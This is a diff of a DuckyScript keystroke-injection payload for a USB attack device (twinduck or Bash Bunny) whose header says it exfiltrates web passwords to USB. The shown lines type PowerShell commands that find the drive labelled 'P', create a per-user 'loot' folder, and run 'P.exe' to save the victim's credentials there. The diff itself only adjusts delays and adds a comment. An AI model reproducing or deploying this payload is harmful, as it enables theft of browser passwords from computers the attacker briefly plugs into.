@@ -2,6 +2,7 @@ REM exfiltrate web passwords to usb, twinduck, or bashbunny
 REM created by : C0SM0
 
 REM PLEASE RUN THE "P.exe" FILE ON THE SD CARD BEFORE USING THIS SCRIPT
+REM A "P.cfg" FILE SHOULD APPEAR
 
 REM let computer recognize our twinduck
 DELAY 1000
@@ -16,18 +17,18 @@ DELAY 300
 REM cd into the twinduck, labled "P", add to clipboard
 STRING $u=gwmi Win32_Volume|?{$_.Label -eq'P'}|select name;cd $u.name
 ENTER
-DELAY 200
+DELAY 350
 STRING mkdir loot
 ENTER
-DELAY 200
+DELAY 400
 STRING mkdir loot\$env:UserName
 ENTER
-DELAY 200
+DELAY 350
 STRING $u.name+"loot\"+$env:UserName | clip
 ENTER
 
 REM run "P.exe" and save creds to loot folder in clipboard
-DELAY 100
+DELAY 200
 STRING ./P.exe;exit
 ENTER
 DELAY 2000
